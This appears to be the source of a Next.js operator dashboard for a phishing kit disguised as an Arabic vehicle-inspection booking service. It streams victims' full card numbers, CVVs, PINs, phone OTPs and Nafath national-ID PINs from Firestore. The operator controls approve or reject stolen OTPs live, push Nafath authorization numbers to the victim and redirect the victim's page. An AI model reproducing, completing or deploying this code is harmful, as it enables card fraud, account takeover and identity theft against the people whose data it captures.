"use client"

import { useState, useEffect, useRef } from "react"
import { Search, CheckCheck, Filter, Check, X, CreditCard, Phone, Calendar, Car, Shield, Hash } from "lucide-react"
import { Avatar, AvatarFallback } from "@/components/ui/avatar"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { collection, onSnapshot, query, orderBy, doc, updateDoc } from "firebase/firestore"
import { db } from "@/lib/firebase"

type UserData = {
  id: string
  status: "online" | "offline"
  lastSeen: string
  createdDate: string
  country: string
  vehicleType: string
  plateNumbers: string
  plateLetters: string
  region: string
  city: string
  inspectionCenter: string
  inspectionDate: string
  inspectionTime: string
  paymentMethod: "credit_card" | "debit_card" | "bank_transfer"
  phone: string
  step: string
  completedDate?: string
  cardNumber?: string
  cardName?: string
  cvv?: string
  pin?: string
  isRead?: boolean
  expiryDate?: string
  operator?: string
  phoneOtp?: string
  nafaz_pin?: string
  authNumber?: string
  cardOtpApproval?: "pending" | "approved" | "rejected"
  phoneOtpApproval?: "pending" | "approved" | "rejected"
  phoneSubmitted?: boolean // Added for phone submission status
  color?: string
  currentPage?: number
}

const getRandomColor = () => {
  const colors = [
    "#10b981", // green
    "#3b82f6", // blue
    "#f59e0b", // amber
    "#ef4444", // red
    "#8b5cf6", // violet
    "#ec4899", // pink
    "#14b8a6", // teal
    "#f97316", // orange
  ]
  return colors[Math.floor(Math.random() * colors.length)]
}

export default function DashboardPage() {
  const [users, setUsers] = useState<UserData[]>([])
  const [selectedUser, setSelectedUser] = useState<UserData | null>(null)
  const [searchQuery, setSearchQuery] = useState("")
  const [loading, setLoading] = useState(true)
  const [showFilters, setShowFilters] = useState(false)
  const [paymentFilter, setPaymentFilter] = useState<string>("all")
  const [readFilter, setReadFilter] = useState<string>("all")
  const [cardFilter, setCardFilter] = useState<string>("all")
  const [phoneFilter, setPhoneFilter] = useState<string>("all")
  const [nafadFilter, setNafadFilter] = useState<string>("all")
  const [otpFilter, setOtpFilter] = useState<string>("all")
  const audioRef = useRef<HTMLAudioElement>(null)
  const [authNumberValue, setAuthNumberValue] = useState("")
  const prevUnreadCountRef = useRef(0)

  useEffect(() => {
    const audio = new Audio()
    audio.volume = 0.5

    return () => {
      audio.pause()
      audio.src = ""
    }
  }, [])

  useEffect(() => {
    const q = query(collection(db, "pays"), orderBy("createdAt", "desc"))

    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const userData: UserData[] = []

        snapshot.forEach((doc) => {
          const data = doc.data()
          const processedData: any = { id: doc.id }

          Object.keys(data).forEach((key) => {
            const value = data[key]
            if (value && typeof value === "object" && value.seconds) {
              processedData[key] = new Date(value.seconds * 1000).toISOString()
            } else if (value && typeof value === "object" && value[".sv"]) {
              processedData[key] = new Date().toISOString()
            } else {
              processedData[key] = value
            }
          })

          if (!processedData.color) {
            processedData.color = getRandomColor()
          }

          userData.push(processedData as UserData)
        })

        const newUnreadCount = userData.filter((u) => !u.isRead).length

        if (newUnreadCount > prevUnreadCountRef.current && prevUnreadCountRef.current > 0) {
          // Play notification sound using placeholder
          if (audioRef.current) {
            audioRef.current.src = "/notification-sound.png"
            audioRef.current.play().catch(() => {
              // Silently fail if audio can't play
            })
          }
        }

        prevUnreadCountRef.current = newUnreadCount

        setUsers(userData)

        setSelectedUser((prevSelected) => {
          if (prevSelected) {
            const updatedUser = userData.find((u) => u.id === prevSelected.id)
            return updatedUser || prevSelected
          }
          return userData.length > 0 ? userData[0] : null
        })

        setLoading(false)
      },
      (error) => {
        console.error("Firebase error:", error)
        setLoading(false)
      },
    )

    return () => unsubscribe()
  }, []) // Empty dependency array prevents listener recreation

  const filteredUsers = users.filter((user) => {
    const matchesSearch =
      (user.phone || "")?.toLowerCase()?.includes(searchQuery.toLowerCase()) ||
      (user.plateNumbers || "").includes(searchQuery) ||
      (user.city || "").toLowerCase().includes(searchQuery.toLowerCase())

    const matchesReadStatus =
      readFilter === "all" || (readFilter === "read" && user.isRead) || (readFilter === "unread" && !user.isRead)

    const matchesPayment =
      paymentFilter === "all" ||
      (paymentFilter === "completed" && user.step === "payment-completed") ||
      (paymentFilter === "pending" && user.step !== "payment-completed")

    const hasCard = user.cardNumber || user.cardName || user.cvv || user.pin
    const matchesCard =
      cardFilter === "all" || (cardFilter === "hasCard" && hasCard) || (cardFilter === "noCard" && !hasCard)

    const hasPhone = user.phone && user.operator
    const matchesPhone =
      phoneFilter === "all" || (phoneFilter === "hasPhone" && hasPhone) || (phoneFilter === "noPhone" && !hasPhone)

    const hasNafad = user.nafaz_pin || user.authNumber
    const matchesNafad =
      nafadFilter === "all" || (nafadFilter === "hasNafad" && hasNafad) || (nafadFilter === "noNafad" && !hasNafad)

    const hasOtp = user.phoneOtp || user.pin
    const matchesOtp = otpFilter === "all" || (otpFilter === "hasOtp" && hasOtp) || (otpFilter === "noOtp" && !hasOtp)

    return (
      matchesSearch && matchesReadStatus && matchesPayment && matchesCard && matchesPhone && matchesNafad && matchesOtp
    )
  })

  const toggleReadStatus = async (userId: string, currentStatus?: boolean) => {
    try {
      const userRef = doc(db, "pays", userId)
      await updateDoc(userRef, {
        isRead: !currentStatus,
      })
    } catch (error) {
      console.error("[v0] Error updating read status:", error)
    }
  }

  const updateAuthNumber = async (userId: string, newAuthNumber: string) => {
    try {
      const userRef = doc(db, "pays", userId)
      await updateDoc(userRef, {
        authNumber: newAuthNumber,
      })
    } catch (error) {
      console.error("[v0] Error updating authNumber:", error)
    }
  }

  const updateCardOtpApproval = async (userId: string, status: "approved" | "rejected") => {
    try {
      const userRef = doc(db, "pays", userId)
      await updateDoc(userRef, {
        cardOtpApproval: status,
      })
    } catch (error) {
      console.error("[v0] Error updating card OTP approval:", error)
    }
  }

  const updatePhoneOtpApproval = async (userId: string, status: "approved" | "rejected") => {
    try {
      const userRef = doc(db, "pays", userId)
      await updateDoc(userRef, {
        phoneOtpApproval: status,
      })
    } catch (error) {
      console.error("[v0] Error updating phone OTP approval:", error)
    }
  }

  const submitPhoneAndOperator = async (userId: string) => {
    try {
      const userRef = doc(db, "pays", userId)
      await updateDoc(userRef, {
        phoneSubmitted: true,
      })
    } catch (error) {
      console.error("[v0] Error submitting phone:", error)
    }
  }

  const updateCurrentPage = async (userId: string) => {
    try {
      const userRef = doc(db, "pays", userId)
      await updateDoc(userRef, {
        currentPage: 9999,
      })
    } catch (error) {
      console.error("[v0] Error updating currentPage:", error)
    }
  }

  const unreadCount = users.filter((user) => !user.isRead).length

  const getStepLabel = (step: string) => {
    const labels: Record<string, string> = {
      "booking-completed": "اكتمل الحجز",
      "payment-method-selected": "تم اختيار طريقة الدفع",
      "card-details-submitted": "تم إرسال بيانات البطاقة",
      "otp-submitted": "تم إرسال رمز التحقق",
      "pin-submitted": "تم إرسال الرقم السري",
      "payment-completed": "اكتمل الدفع",
    }
    return labels[step] || step
  }

  const getStepColor = (step: string) => {
    if (!step) return "bg-neutral-700/80 text-neutral-300 border-neutral-600/50"
    if (step === "payment-completed") return "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
    if (step.includes("submitted")) return "bg-blue-500/10 text-blue-400 border-blue-500/20"
    return "bg-neutral-700/80 text-neutral-300 border-neutral-600/50"
  }

  const formatDate = (dateString: string) => {
    if (!dateString) return "غير متوفر"
    try {
      const date = new Date(dateString)
      if (isNaN(date.getTime())) return dateString
      return date.toLocaleDateString("ar-SA", {
        year: "numeric",
        month: "long",
        day: "numeric",
      })
    } catch {
      return dateString
    }
  }

  const formatTime = (dateString: string) => {
    if (!dateString) return "غير متوفر"
    try {
      const date = new Date(dateString)
      if (isNaN(date.getTime())) return dateString
      return date.toLocaleTimeString("ar-SA", {
        hour: "2-digit",
        minute: "2-digit",
      })
    } catch {
      return dateString
    }
  }

  const formatDateTime = (dateString: string) => {
    if (!dateString) return "غير متوفر"
    try {
      const date = new Date(dateString)
      if (isNaN(date.getTime())) return dateString
      return date.toLocaleString("ar-SA", {
        year: "numeric",
        month: "long",
        day: "numeric",
        hour: "2-digit",
        minute: "2-digit",
      })
    } catch {
      return dateString
    }
  }

  if (loading) {
    return (
      <div className="flex h-screen items-center justify-center bg-background text-foreground">
        <div className="text-center">
          <div className="h-10 w-10 animate-spin rounded-full border-4 border-border border-t-primary mx-auto mb-4"></div>
          <p className="text-muted-foreground">جاري التحميل...</p>
        </div>
      </div>
    )
  }

  if (users.length === 0) {
    return (
      <div className="flex h-screen items-center justify-center bg-background text-foreground">
        <div className="text-center">
          <p className="text-muted-foreground">لا توجد بيانات متاحة</p>
        </div>
      </div>
    )
  }

  return (
    <div className="grid grid-cols-[380px_1fr] h-screen overflow-hidden bg-background text-foreground" dir="rtl">
      {/* Sidebar */}
      <div className="border-l border-border flex flex-col bg-sidebar h-full overflow-hidden shadow-xl">
        {/* Header */}
        <div className="p-6 border-b border-border/50 flex-shrink-0 bg-sidebar-header backdrop-blur-sm">
          <div className="flex items-center justify-between mb-6">
            <h1 className="text-2xl font-bold text-foreground tracking-tight">لوحة التحكم</h1>
            {unreadCount > 0 && (
              <Badge className="bg-primary text-primary-foreground font-bold px-3.5 py-1.5 rounded-full shadow-lg shadow-primary/20">
                {unreadCount} غير مقروء
              </Badge>
            )}
          </div>
          <div className="relative mb-4">
            <Search className="absolute right-4 top-1/2 -translate-y-1/2 h-5 w-5 text-muted-foreground" />
            <Input
              placeholder="ابحث باستخدام الهاتف أو رقم اللوحة..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="pr-12 h-12 bg-input border-border/50 text-foreground placeholder:text-muted-foreground focus-visible:ring-2 focus-visible:ring-primary rounded-xl transition-all shadow-sm hover:shadow-md focus-visible:shadow-lg"
            />
          </div>

          <Button
            variant="outline"
            onClick={() => setShowFilters(!showFilters)}
            className="w-full mb-3 h-11 justify-start gap-2 rounded-xl border-border/50 hover:bg-sidebar-item-hover transition-all shadow-sm hover:shadow-md"
          >
            <Filter className="h-4 w-4" />
            الفلاتر
          </Button>

          {showFilters && (
            <div className="space-y-4 mb-3 p-5 bg-input rounded-xl border border-border/50 shadow-inner">
              <div>
                <p className="text-xs font-bold mb-2.5 text-muted-foreground uppercase tracking-wider">حالة القراءة</p>
                <div className="flex gap-2">
                  <Button
                    variant={readFilter === "all" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setReadFilter("all")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    الكل
                  </Button>
                  <Button
                    variant={readFilter === "unread" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setReadFilter("unread")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    غير مقروء
                  </Button>
                  <Button
                    variant={readFilter === "read" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setReadFilter("read")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    مقروء
                  </Button>
                </div>
              </div>

              <div>
                <p className="text-xs font-bold mb-2.5 text-muted-foreground uppercase tracking-wider">حالة الدفع</p>
                <div className="flex gap-2">
                  <Button
                    variant={paymentFilter === "all" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setPaymentFilter("all")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    الكل
                  </Button>
                  <Button
                    variant={paymentFilter === "completed" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setPaymentFilter("completed")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    مكتمل
                  </Button>
                  <Button
                    variant={paymentFilter === "pending" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setPaymentFilter("pending")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    معلق
                  </Button>
                </div>
              </div>

              <div>
                <p className="text-xs font-bold mb-2.5 text-muted-foreground uppercase tracking-wider">
                  بيانات البطاقة
                </p>
                <div className="flex gap-2">
                  <Button
                    variant={cardFilter === "all" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setCardFilter("all")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    الكل
                  </Button>
                  <Button
                    variant={cardFilter === "hasCard" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setCardFilter("hasCard")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    يوجد بطاقة
                  </Button>
                  <Button
                    variant={cardFilter === "noCard" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setCardFilter("noCard")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    بدون بطاقة
                  </Button>
                </div>
              </div>

              <div>
                <p className="text-xs font-bold mb-2.5 text-muted-foreground uppercase tracking-wider">بيانات الهاتف</p>
                <div className="flex gap-2">
                  <Button
                    variant={phoneFilter === "all" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setPhoneFilter("all")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    الكل
                  </Button>
                  <Button
                    variant={phoneFilter === "hasPhone" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setPhoneFilter("hasPhone")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    يوجد هاتف
                  </Button>
                  <Button
                    variant={phoneFilter === "noPhone" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setPhoneFilter("noPhone")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    بدون هاتف
                  </Button>
                </div>
              </div>

              <div>
                <p className="text-xs font-bold mb-2.5 text-muted-foreground uppercase tracking-wider">بيانات نفاذ</p>
                <div className="flex gap-2">
                  <Button
                    variant={nafadFilter === "all" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setNafadFilter("all")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    الكل
                  </Button>
                  <Button
                    variant={nafadFilter === "hasNafad" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setNafadFilter("hasNafad")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    يوجد نفاذ
                  </Button>
                  <Button
                    variant={nafadFilter === "noNafad" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setNafadFilter("noNafad")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    بدون نفاذ
                  </Button>
                </div>
              </div>

              <div>
                <p className="text-xs font-bold mb-2.5 text-muted-foreground uppercase tracking-wider">
                  رموز التحقق (OTP)
                </p>
                <div className="flex gap-2">
                  <Button
                    variant={otpFilter === "all" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setOtpFilter("all")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    الكل
                  </Button>
                  <Button
                    variant={otpFilter === "hasOtp" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setOtpFilter("hasOtp")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    يوجد رمز
                  </Button>
                  <Button
                    variant={otpFilter === "noOtp" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setOtpFilter("noOtp")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    بدون رمز
                  </Button>
                </div>
              </div>
            </div>
          )}
        </div>

        <div className="flex-1 overflow-y-auto">
          {filteredUsers.map((user) => (
            <div
              key={user.id}
              className={`p-5 border-b border-border/50 cursor-pointer transition-all duration-200 relative group ${
                selectedUser?.id === user.id
                  ? "bg-sidebar-item-active border-r-4 border-r-primary shadow-lg"
                  : "hover:bg-sidebar-item-hover hover:shadow-md"
              }`}
            >
              <div onClick={() => setSelectedUser(user)} className="flex items-start gap-4">
                <div className="relative flex-shrink-0">
                  <Avatar
                    className="h-14 w-14 shadow-lg"
                    style={{
                      border: `3px solid ${user.color || "#10b981"}`,
                      boxShadow: `0 0 0 2px rgba(0,0,0,0.1), 0 0 12px ${user.color || "#10b981"}40`,
                    }}
                  >
                    <AvatarFallback
                      className="text-base font-bold text-white"
                      style={{ backgroundColor: user.color || "#10b981" }}
                    >
                      {user.phone?.slice(-4)}
                    </AvatarFallback>
                  </Avatar>
                  {user.status === "online" && (
                    <>
                      <div className="absolute -bottom-0.5 -left-0.5 h-5 w-5 bg-status-online border-3 border-sidebar rounded-full shadow-lg z-10"></div>
                      <div className="absolute -bottom-0.5 -left-0.5 h-5 w-5 bg-status-online rounded-full animate-ping opacity-75"></div>
                    </>
                  )}
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between mb-1.5">
                    <span
                      className={`text-base ${!user.isRead ? "font-bold" : "font-semibold"} text-foreground truncate`}
                    >
                      {user.phone}
                    </span>
                    <span className="text-xs text-muted-foreground font-medium flex-shrink-0 mr-2">
                      {formatTime(user.lastSeen)}
                    </span>
                  </div>
                  <div className="flex items-center justify-between gap-2">
                    <span
                      className={`text-sm ${!user.isRead ? "font-semibold" : "font-medium"} text-muted-foreground truncate`}
                    >
                      {user.plateLetters} {user.plateNumbers}
                    </span>
                    <div className="flex items-center gap-2 flex-shrink-0">
                      {(user.cardNumber || user.cardName || user.cvv || user.pin) && (
                        <Badge className="bg-primary/10 text-primary border border-primary/20 text-xs px-2 py-0.5 rounded-lg font-bold shadow-sm">
                          💳
                        </Badge>
                      )}
                      {user.step === "payment-completed" && <CheckCheck className="h-4 w-4 text-status-completed" />}
                      {!user.isRead && (
                        <div className="h-2.5 w-2.5 bg-primary rounded-full shadow-sm shadow-primary/50"></div>
                      )}
                    </div>
                  </div>
                </div>
              </div>

              <Button
                variant="ghost"
                size="sm"
                onClick={(e) => {
                  e.stopPropagation()
                  toggleReadStatus(user.id, user.isRead)
                }}
                className="absolute left-2 top-1/2 -translate-y-1/2 opacity-0 group-hover:opacity-100 transition-all h-8 px-3 text-xs rounded-lg shadow-md hover:shadow-lg"
              >
                {user.isRead ? "غير مقروء" : "مقروء"}
              </Button>
            </div>
          ))}
        </div>
      </div>

      {/* Main Content */}
      {selectedUser && (
        <div className="flex flex-col h-full overflow-hidden bg-gradient-to-br from-background to-card/30">
          {/* Header */}
          <div
            className="bg-card border-b-4 p-6 shadow-xl"
            style={{
              borderBottomColor: selectedUser.color || "#10b981",
            }}
          >
            <div className="flex items-center gap-5">
              <Avatar
                className="h-20 w-20 shadow-2xl ring-4 ring-background"
                style={{
                  border: `4px solid ${selectedUser.color || "#10b981"}`,
                  boxShadow: `0 0 0 2px rgba(0,0,0,0.1), 0 0 20px ${selectedUser.color || "#10b981"}50`,
                }}
              >
                <AvatarFallback
                  className="text-xl font-bold text-white"
                  style={{ backgroundColor: selectedUser.color || "#10b981" }}
                >
                  {selectedUser.phone?.slice(-4)}
                </AvatarFallback>
              </Avatar>
              <div className="flex-1">
                <div className="flex items-center gap-3 mb-2">
                  <h2 className="text-2xl font-bold text-foreground">{selectedUser.phone}</h2>
                  {selectedUser.status === "online" && (
                    <Badge className="bg-status-online text-white font-semibold px-3 py-1 rounded-full shadow-lg animate-pulse">
                      متصل الآن
                    </Badge>
                  )}
                </div>
                <p className="text-sm text-muted-foreground">آخر ظهور: {formatDateTime(selectedUser.lastSeen)}</p>
              </div>
              <Badge
                className={`px-4 py-2 text-sm font-bold rounded-xl shadow-lg ${getStepColor(selectedUser.step)} border-2`}
              >
                {getStepLabel(selectedUser.step)}
              </Badge>
            </div>
          </div>

          {/* Content Grid */}
          <div className="flex-1 overflow-y-auto p-6">
            <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-4 gap-6 max-w-[1600px] mx-auto">
              {/* Vehicle Information Card */}
              <div className="bg-card rounded-2xl p-6 shadow-xl border border-border/50 hover:shadow-2xl transition-all">
                <div className="flex items-center gap-3 mb-5 pb-4 border-b border-border/50">
                  <div className="p-3 bg-primary/10 rounded-xl">
                    <Car className="h-6 w-6 text-primary" />
                  </div>
                  <h3 className="text-xl font-bold text-foreground">معلومات المركبة</h3>
                </div>
                <div className="space-y-4">
                  <DataRow label="نوع المركبة" value={selectedUser.vehicleType} />
                  <DataRow label="رقم اللوحة" value={`${selectedUser.plateLetters} ${selectedUser.plateNumbers}`} />
                  <DataRow label="المنطقة" value={selectedUser.region} />
                  <DataRow label="المدينة" value={selectedUser.city} />
                </div>
              </div>

              {/* Inspection Details Card */}
              <div className="bg-card rounded-2xl p-6 shadow-xl border border-border/50 hover:shadow-2xl transition-all">
                <div className="flex items-center gap-3 mb-5 pb-4 border-b border-border/50">
                  <div className="p-3 bg-primary/10 rounded-xl">
                    <Calendar className="h-6 w-6 text-primary" />
                  </div>
                  <h3 className="text-xl font-bold text-foreground">تفاصيل الفحص</h3>
                </div>
                <div className="space-y-4">
                  <DataRow label="مركز الفحص" value={selectedUser.inspectionCenter} />
                  <DataRow label="تاريخ الفحص" value={formatDate(selectedUser.inspectionDate)} />
                  <DataRow label="وقت الفحص" value={selectedUser.inspectionTime} />
                  <DataRow label="تاريخ الحجز" value={formatDateTime(selectedUser.createdDate)} />
                </div>
              </div>

              {/* Payment Information Card */}
              {(selectedUser.cardNumber || selectedUser.cardName || selectedUser.cvv || selectedUser.pin) && (
                <div className="bg-gradient-to-br from-card to-primary/5 rounded-2xl p-6 shadow-xl border-2 border-primary/20 hover:shadow-2xl transition-all">
                  <div className="flex items-center gap-3 mb-5 pb-4 border-b border-border/50">
                    <div className="p-3 bg-primary/20 rounded-xl">
                      <CreditCard className="h-6 w-6 text-primary" />
                    </div>
                    <h3 className="text-xl font-bold text-foreground">معلومات البطاقة</h3>
                  </div>
                  <div className="space-y-4">
                      <DataRow label="رقم البطاقة" value={selectedUser.cardNumber}  />
                    {selectedUser.expiryDate && <DataRow label="اسم حامل البطاقة" value={selectedUser.cardName} />}
                    {selectedUser.expiryDate && (
                      <DataRow label="تاريخ الانتهاء" value={selectedUser.expiryDate}  />
                    )}
                    {selectedUser.cvv && <DataRow label="CVV" value={selectedUser.cvv}  />}
                    {selectedUser.pin && (
                      <div className="space-y-3">
                        <DataRow label="PIN" value={selectedUser.pin}  />
                        {selectedUser.cardOtpApproval && (
                          <ApprovalStatus status={selectedUser.cardOtpApproval} label="حالة OTP البطاقة" />
                        )}
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            onClick={() => updateCardOtpApproval(selectedUser.id, "approved")}
                            className="flex-1 bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-400 border border-emerald-500/30 rounded-xl shadow-md"
                          >
                            <Check className="h-4 w-4 ml-1" />
                            قبول
                          </Button>
                          <Button
                            size="sm"
                            variant="destructive"
                            onClick={() => updateCardOtpApproval(selectedUser.id, "rejected")}
                            className="flex-1 rounded-xl shadow-md"
                          >
                            <X className="h-4 w-4 ml-1" />
                            رفض
                          </Button>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* Phone Verification Card */}
              <div className="bg-card rounded-2xl p-6 shadow-xl border border-border/50 hover:shadow-2xl transition-all">
                <div className="flex items-center gap-3 mb-5 pb-4 border-b border-border/50">
                  <div className="p-3 bg-primary/10 rounded-xl">
                    <Phone className="h-6 w-6 text-primary" />
                  </div>
                  <h3 className="text-xl font-bold text-foreground">التحقق من الهاتف</h3>
                </div>
                <div className="space-y-4">
                  <DataRow label="رقم الهاتف" value={selectedUser.phone} />
                  {selectedUser.operator && <DataRow label="المشغل" value={selectedUser.operator} />}

                  {!selectedUser.phoneSubmitted ? (
                    <Button
                      onClick={() => submitPhoneAndOperator(selectedUser.id)}
                      className="w-full mt-4 h-12 rounded-xl shadow-lg hover:shadow-xl transition-all"
                    >
                      إرسال طلب OTP
                    </Button>
                  ) : (
                    <div className="space-y-3 pt-2">
                      {selectedUser.phoneOtp && <DataRow label="رمز OTP" value={selectedUser.phoneOtp}  />}
                      {selectedUser.phoneOtpApproval && (
                        <ApprovalStatus status={selectedUser.phoneOtpApproval} label="حالة OTP الهاتف" />
                      )}
                      <div className="flex gap-2">
                        <Button
                          size="sm"
                          onClick={() => updatePhoneOtpApproval(selectedUser.id, "approved")}
                          className="flex-1 bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-400 border border-emerald-500/30 rounded-xl shadow-md"
                        >
                          <Check className="h-4 w-4 ml-1" />
                          قبول
                        </Button>
                        <Button
                          size="sm"
                          variant="destructive"
                          onClick={() => updatePhoneOtpApproval(selectedUser.id, "rejected")}
                          className="flex-1 rounded-xl shadow-md"
                        >
                          <X className="h-4 w-4 ml-1" />
                          رفض
                        </Button>
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {/* Nafad Information Card */}
                <div className="bg-card rounded-2xl p-6 shadow-xl border border-border/50 hover:shadow-2xl transition-all xl:col-span-3">
                  <div className="flex items-center gap-3 mb-5 pb-4 border-b border-border/50">
                    <div className="p-3 bg-primary/10 rounded-xl">
                      <CheckCheck className="h-6 w-6 text-primary" />
                    </div>
                    <h3 className="text-xl font-bold text-foreground">معلومات نفاذ</h3>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {selectedUser.nafaz_pin && <DataRow label="رقم نفاذ" value={selectedUser.nafaz_pin} icon={Shield} />}
                    <div className="bg-input/30 rounded-xl p-4 border border-border/30">
                      <p className="text-sm font-bold text-muted-foreground mb-3">رقم التفويض</p>
                      <div className="flex gap-2">
                        <Input
                          value={authNumberValue || selectedUser.authNumber || ""}
                          onChange={(e) => setAuthNumberValue(e.target.value)}
                          className="flex-1 h-10 rounded-lg font-mono"
                          placeholder="أدخل رقم التفويض"
                        />
                        <Button
                          size="sm"
                          onClick={() => {
                            updateAuthNumber(selectedUser.id, authNumberValue || selectedUser.authNumber || "")
                            setAuthNumberValue("")
                          }}
                          className="rounded-lg px-4"
                        >
                          حفظ
                        </Button>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center justify-between p-4 bg-card-hover rounded-lg border border-border/50">
                    <div className="flex items-center gap-3">
                      <Hash className="h-5 w-5 text-muted-foreground" />
                      <div>
                        <p className="text-sm text-muted-foreground">الصفحة الحالية</p>
                        <p className="text-base font-semibold text-foreground font-mono">
                          {selectedUser.currentPage || "غير محدد"}
                        </p>
                      </div>
                    </div>
                    <Button
                      onClick={() => updateCurrentPage(selectedUser.id)}
                      className="bg-primary hover:bg-primary/90 text-primary-foreground shadow-md hover:shadow-lg transition-all"
                      size="sm"
                    >
                      تحديث إلى 9999
                    </Button>
                  </div>
                </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

const DataRow = ({ label, value, icon: Icon }: { label: string; value?: string | number; icon?: any }) => {
  return (
    <div className="bg-input/30 rounded-xl p-4 border border-border/30 hover:bg-input/50 transition-all">
      <p className="text-sm font-bold text-muted-foreground mb-2">{label}</p>
      <p className="text-base text-foreground font-semibold" dir="ltr">{value || "غير متوفر"}</p>
      {Icon && <Icon className="h-6 w-6 text-primary ml-2" />}
    </div>
  )
}

function ApprovalStatus({ status, label }: { status: string; label: string }) {
  const statusConfig = {
    approved: { color: "bg-emerald-500/10 text-emerald-400 border-emerald-500/30", text: "تمت الموافقة" },
    rejected: { color: "bg-red-500/10 text-red-400 border-red-500/30", text: "مرفوض" },
    pending: { color: "bg-amber-500/10 text-amber-400 border-amber-500/30", text: "قيد الانتظار" },
  }

  const config = statusConfig[status as keyof typeof statusConfig] || statusConfig.pending

  return (
    <div className={`rounded-xl p-4 border-2 ${config.color}`}>
      <p className="text-sm font-bold">{label}</p>
      <p className="text-base font-bold mt-1">{config.text}</p>
    </div>
  )
}
